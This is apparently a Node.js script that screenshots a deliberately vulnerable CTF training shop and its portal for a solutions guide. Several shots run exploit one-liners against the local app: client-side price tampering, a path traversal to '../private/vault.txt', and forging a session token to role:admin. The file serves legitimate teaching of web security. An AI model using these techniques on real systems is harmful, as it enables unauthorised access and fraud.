#!/usr/bin/env node
// Captures screenshots of the NeonCart app and the CTF portal for the
// solutions guide. Uses a headless Brave/Chrome over the DevTools protocol -
// no extra npm dependencies.
//
//   node docs/tools/capture-screenshots.js [--out docs/photos] [--app http://localhost:3307]
//                                   [--portal http://localhost:5174]
//
// Every shot can include an optional "action" (JavaScript run in the page
// after it loads) so the screenshots show the exploit, not just the form.

import fs from 'node:fs'
import path from 'node:path'
import { spawn } from 'node:child_process'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(__dirname, '..', '..')

const args = process.argv.slice(2)
const opt = (name, fallback) => {
  const i = args.indexOf(`--${name}`)
  return i === -1 ? fallback : args[i + 1]
}

const OUT = path.resolve(repoRoot, opt('out', 'docs/photos'))
// --only <name> captures a single shot, e.g. the storefront of a stage-00
// snapshot, which is the only build that still carries the build key.
const ONLY = opt('only', null)
const APP = opt('app', 'http://localhost:3307')
const PORTAL = opt('portal', 'http://localhost:5174')
const PORT = 9333

const BRAVE_CANDIDATES = [
  '/snap/brave/696/opt/brave.com/brave/brave',
  '/usr/bin/brave-browser',
  '/usr/bin/brave',
  '/usr/bin/chromium',
  '/usr/bin/chromium-browser',
  '/usr/bin/google-chrome',
]

function findBrowser() {
  for (const c of BRAVE_CANDIDATES) if (fs.existsSync(c)) return c
  throw new Error('No brave/chromium binary found')
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

class CDP {
  constructor(ws) {
    this.ws = ws
    this.id = 0
    this.pending = new Map()
    this.listeners = []
    ws.addEventListener('message', (ev) => {
      const msg = JSON.parse(ev.data)
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id)
        this.pending.delete(msg.id)
        msg.error ? reject(new Error(msg.error.message)) : resolve(msg.result)
      } else if (msg.method) {
        for (const l of this.listeners) l(msg)
      }
    })
  }

  send(method, params = {}) {
    const id = ++this.id
    this.ws.send(JSON.stringify({ id, method, params }))
    return new Promise((resolve, reject) => this.pending.set(id, { resolve, reject }))
  }

  on(fn) {
    this.listeners.push(fn)
  }

  async waitFor(method, timeout = 15000) {
    return new Promise((resolve, reject) => {
      const t = setTimeout(() => reject(new Error(`timeout waiting for ${method}`)), timeout)
      const handler = (msg) => {
        if (msg.method === method) {
          clearTimeout(t)
          this.listeners = this.listeners.filter((l) => l !== handler)
          resolve(msg.params)
        }
      }
      this.on(handler)
    })
  }

  async evaluate(expression) {
    const r = await this.send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true })
    return r.result && r.result.value
  }

  async shot(file) {
    const r = await this.send('Page.captureScreenshot', { format: 'png', captureBeyondViewport: true })
    fs.writeFileSync(file, Buffer.from(r.data, 'base64'))
    return file
  }
}

async function connect() {
  let list = []
  for (let i = 0; i < 40; i++) {
    try {
      const res = await fetch(`http://127.0.0.1:${PORT}/json/list`)
      list = await res.json()
      if (list.some((t) => t.type === 'page')) break
    } catch {
      /* not up yet */
    }
    await sleep(250)
  }
  const page = list.find((t) => t.type === 'page')
  if (!page) throw new Error('no page target')
  const ws = new WebSocket(page.webSocketDebuggerUrl)
  await new Promise((resolve, reject) => {
    ws.addEventListener('open', resolve)
    ws.addEventListener('error', reject)
  })
  return new CDP(ws)
}

async function goto(cdp, url) {
  await cdp.send('Page.navigate', { url })
  await cdp.waitFor('Page.loadEventFired').catch(() => {})
  await sleep(700)
}

const SHOTS = [
  {
    name: 'app-storefront',
    url: `${APP}/`,
    caption: 'Module 00 - the storefront prints the deployment build key: the first flag of the session.',
  },
  {
    name: 'app-diagnostics-page',
    url: `${APP}/ui/diagnostics`,
    caption: 'Module 01 - the diagnostics page before the click.',
  },
  {
    name: 'app-home',
    url: `${APP}/`,
    caption: 'The app home page lists every route the app exposes.',
  },
  {
    name: 'app-diagnostics',
    url: `${APP}/ui/diagnostics`,
    action: `document.querySelector('button').click()`,
    caption: 'Module 01 - the system status page prints the raw service report, internal build key included.',
  },
  {
    name: 'app-tickets',
    url: `${APP}/ui/tickets?id=1`,
    action: `location.search='?id=1'`,
    wait: 1200,
    caption: 'Module 02 - ticket #1 belongs to staff, but the detail endpoint serves it anyway.',
  },
  {
    name: 'app-checkout',
    url: `${APP}/ui/checkout`,
    action: `(async()=>{for(let i=0;i<30 && !Object.keys(catalog).length;i++){await new Promise(r=>setTimeout(r,100));}catalog['neon-drone'].price=1;add('neon-drone');await pay();})()`,
    wait: 1500,
    caption: 'Module 03 - the browser sends the total, so paying 1 instead of 199 reaches the internal re-pricing path.',
  },
  {
    name: 'app-files',
    url: `${APP}/ui/files`,
    action: `call('GET','/api/files/download?name=../private/vault.txt')`,
    wait: 1000,
    caption: 'Module 04 - the file name walks out of the upload directory into the private vault.',
  },
  {
    name: 'app-session',
    url: `${APP}/ui/session`,
    action: `(async()=>{await new Promise(r=>setTimeout(r,700));const t=window.neonToken||(await (await fetch('/api/session/issue',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({user_id:42})})).json()).token;const p=t.split('.')[0];const pl=JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));pl.role='admin';const f=btoa(JSON.stringify(pl)).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');window.neonToken=f+'.'+t.split('.')[1];document.getElementById('token').value=window.neonToken;await call('GET','/api/admin/panel');})()`,
    caption: 'Module 05 - the payload is edited to role:admin and the panel opens.',
  },
  {
    name: 'app-logs',
    url: `${APP}/logs`,
    caption: 'The app logs its own reasoning - the teaching channel for every module.',
  },
  {
    name: 'portal-login',
    url: `${PORTAL}/`,
    caption: 'The portal entry point. Players register and compete individually.',
  },
  {
    name: 'portal-modules',
    url: `${PORTAL}/`,
    auth: 'player',
    caption: 'The module list: status badge, download button and the flag submission box.',
  },
  {
    name: 'portal-admin',
    url: `${PORTAL}/`,
    auth: 'admin',
    caption: 'The admin panel: release a module, set its countdown, post announcements.',
  },
]

async function main() {
  fs.mkdirSync(OUT, { recursive: true })
  const browser = spawn(
    findBrowser(),
    [
      '--headless=new',
      '--disable-gpu',
      '--no-sandbox',
      '--disable-dev-shm-usage',
      '--hide-scrollbars',
      `--remote-debugging-port=${PORT}`,
      '--window-size=1280,900',
      'about:blank',
    ],
    { stdio: 'ignore' },
  )

  let cdp
  try {
    cdp = await connect()
    await cdp.send('Page.enable')
    await cdp.send('Runtime.enable')

    const tokens = {
      player: process.env.PORTAL_TOKEN || '',
      admin: process.env.ADMIN_TOKEN || '',
    }

    for (const shot of SHOTS) {
      if (ONLY && shot.name !== ONLY) continue
      if (shot.auth) {
        await goto(cdp, `${PORTAL}/`)
        await cdp.evaluate(`localStorage.setItem('ctf_token', ${JSON.stringify(tokens[shot.auth])})`)
      }
      await goto(cdp, shot.url)
      if (shot.action) {
        await cdp.evaluate(shot.action)
        await sleep(shot.wait || 900)
      }
      if (shot.reload) {
        await goto(cdp, shot.url)
      }
      const file = path.join(OUT, `${shot.name}.png`)
      await cdp.shot(file)
      console.log(`  ${shot.name}.png`)
    }
  } finally {
    if (cdp) cdp.ws.close()
    browser.kill()
  }
  console.log(`screenshots written to ${OUT}`)
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
